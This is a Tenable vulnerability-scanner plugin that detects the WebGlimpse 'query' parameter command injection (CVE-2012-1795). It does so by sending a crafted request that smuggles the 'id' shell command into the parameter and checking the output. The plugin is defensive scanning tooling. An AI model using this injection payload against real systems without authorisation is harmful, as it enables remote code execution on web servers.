#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(58412);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/11/18 21:03:58 $");

  script_cve_id("CVE-2012-1795");
  script_bugtraq_id(52627);
  script_osvdb_id(80344);
  script_xref(name:"CERT", value:"364363");

  script_name(english:"WebGlimpse query Parameter Command Injection");
  script_summary(english:"Tries to run a command");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a CGI script that contains a command
injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of WebGlimpse installed on the remote host does not
sufficiently sanitize user input to the 'query' parameter of the
'webglimpse.cgi' script before using it to construct and then run a
command.

An unauthenticated, remote attacker can leverage this issue to execute
arbitrary code on the affected host, subject to the privileges under
which the web server runs.

Note that this vulnerability is being actively exploited in the wild
as of March 2012.");
  script_set_attribute(attribute:"solution", value:"Upgrade to WebGlimpse 2.20.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"WebGlimpse 2.18.8 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/03/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/02/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/03/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:webglimpse:webglimpse");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("webglimpse_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/webglimpse");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, embedded:FALSE);

install = get_install_from_kb(appname:"webglimpse", port:port, exit_on_fail:TRUE);
dir = install['dir'];


# Try to exploit the issue to run a command.
cmd = 'id';
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

payload = strcat('\'&', cmd, '&\'');
url = strcat(
  '/webglimpse.cgi?',
  'ID=1&',
  'query=', urlencode(str:payload, unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*()-]"), '&',
  'rankby=DEFAULT&',
  'errors=0&',
  'age=&',
  'maxfiles=20&',
  'maxlines=10&',
  'maxchars=2000&',
  'wordspan=&',
  'cache=yes&',
  'prepath=&',
  'insertbefore=&',
  'postpath='
);
http_check_remote_code(
  port:port,
  unique_dir:dir,
  check_request:url,
  check_result:cmd_pat,
  extra_check:"Output from Glimpse:",
  command:cmd
);
exit(0, "The WebGlimpse install at '+build_url(qs:dir+'/webglimpse.cgi', port:port)+' is not affected.");
